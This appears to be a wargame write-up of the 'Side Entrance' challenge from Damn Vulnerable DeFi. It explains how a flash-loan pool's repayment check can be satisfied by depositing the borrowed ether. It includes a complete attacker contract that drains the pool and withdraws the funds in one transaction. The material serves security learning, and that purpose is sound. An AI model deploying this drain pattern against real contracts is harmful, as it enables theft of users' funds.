# Side Entrance #

here the vulnerability is with the `SideEntranceLenderPool` contract. There is a require statement use to check if the loan has been paid back. Which is where the logic error is.

`pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}`
 
 how can this contract balamce be drained?
` require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");  ` this check is making sure address(this).balance >= balanceBefore. In the contract there is a deposit function that maps each user ether deposit to the users address for withdrawal purpose. so we can hack this contract by borrowing any amount from the flashloan and deeposit it back with the deposit function. The check `address(this).balance >= balanceBefore,` is fulfilled and after depositing.. the user can make the withdrawal of the amount deposited,

The hacker contract[here we want to drain the total ether contract balance]

`contract HackSideEntrance {
    SideEntranceLenderPool public pool;

    constructor(address _pool) public {
        pool = SideEntranceLenderPool(_pool);
    }

    fallback() external payable {}

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        msg.sender.transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}`
 the `attack` function borrow the pool balance and the pool calls the `execute` function in the hackers contract to send the amount requested to the attacker contract. but in the `execute` function we call the `deposit` function to deposit the total money back to the contract thereby our balance in the contract is updated with the amount deposited. `balances[msg.sender] += msg.value;`.
 THe loan is pay back in the same transaction and the account of the attacker is funded in the `flashloan` contract. after this, the withdraw function is called and the total user balance is withdraw from the loan contract. then the amount is transfered to the msg.sender. 

 so we've been able to drain the flashloan contract balance in one transaction.


solution to the challenge [solution](https://github.com/Ultra-Tech-code/damn-vulnerable-defi/blob/c0f88e3e98dbfaba4eb389c94bfe317f6f1de7a9/test/side-entrance/side-entrance.challenge.js#L29)